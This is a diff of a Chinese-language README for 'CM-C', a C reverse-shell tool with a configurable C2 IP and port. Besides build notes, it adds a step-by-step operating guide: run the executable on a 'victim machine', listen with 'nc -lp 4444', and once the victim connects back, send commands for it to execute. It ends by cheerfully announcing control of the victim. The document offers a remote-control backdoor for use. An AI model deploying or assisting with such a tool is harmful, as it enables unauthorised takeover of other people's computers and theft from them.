@@ -30,25 +30,41 @@ cd CM-C
 #ifndef C2_PORT
     #define C2_PORT 4444
 #endif
-
 ```
 
-#### 或者您可以直接使用make编译，他会要求你填入IP与端口
+#### 或者您可以直接使用make编译，它会要求你填入IP与端口（默认IP为127.0.0.1，端口为4444）
 ````makefile
 make
 ````
-> **注意：** 由于msys的特殊性，如果您用msys，输入完IP和PORT后，需要再输入exit退出cmd终端，有知道怎么解决的请到[issue](https://github.com/XiaoZhang-qd/cm-c/issues/1)给作者，谢谢。
+> **注意：** 由于msys的特殊性，如果你用msys，输入完IP和PORT后，需要再输入exit退出cmd终端，有知道怎么解决的请到[issue](https://github.com/XiaoZhang-qd/cm-c/issues/1)给作者，谢谢。
 
 
 ## 编译
 
 - 你需要先有make工具链
-- Windows 系统可用MinGW、MSYC、MSYC2、Cygwin（可能会需要依赖cygwin1.dll）、WSL等等
+- Windows 系统可用MinGW、MSYC（可能会需要依赖msys-1.0.dll）、MSYC2（可能会需要依赖msys-2.0.dll）、Cygwin（可能会需要依赖cygwin1.dll）、WSL等等
 - 其他的系统（如Linux、macOS、BSD等等）如果有你需要先有make工具链可直接编译。
 
 ````makefile
 make
 ````
+
+## 操作方法
+1. 在受害机上运行编译后的可执行文件。
+2. 控制端使用NetCat的nc或者ncat等等作为控制端，连接到受害机的IP和端口。
+3. 如(nc)：
+````bash
+nc -lp 4444
+````
+4. 受害机上线后，控制端会显示信息如：
+```
+[+] Connected successfully.
+-{2026-05-05 16:58:12}-{(mapp.exe)[C:\Users\unil\项目\CM-C]}->
+```
+5. 控制端可以输入命令，受害机会执行并返回结果。
+6. 控制端可以输入exit退出连接。
+
+- 现在你可以控制受害机啦！要注意[使用声明](#使用声明)哦。
 
 ## 有任何问题和建议，请[issue](https://github.com/XiaoZhang-qd/cm-c/issues/1)给作者，谢谢。
 
